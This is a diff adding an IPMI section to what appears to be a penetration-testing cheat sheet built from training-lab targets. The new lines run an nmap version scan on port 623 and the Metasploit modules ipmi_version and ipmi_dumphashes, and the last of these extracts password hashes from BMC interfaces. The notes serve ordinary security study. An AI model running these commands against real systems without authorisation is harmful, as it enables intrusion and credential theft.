@@ -255,3 +255,22 @@ python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
 ```bash
 ./odat.py all -s <ip>
 ```
+
+### IPMI :
+```bash
+ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
+
+msf6 > use auxiliary/scanner/ipmi/ipmi_version 
+msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
+msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 
+msf6 auxiliary(scanner/ipmi/ipmi_version) > run
+
+
+
+msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
+
+
+```
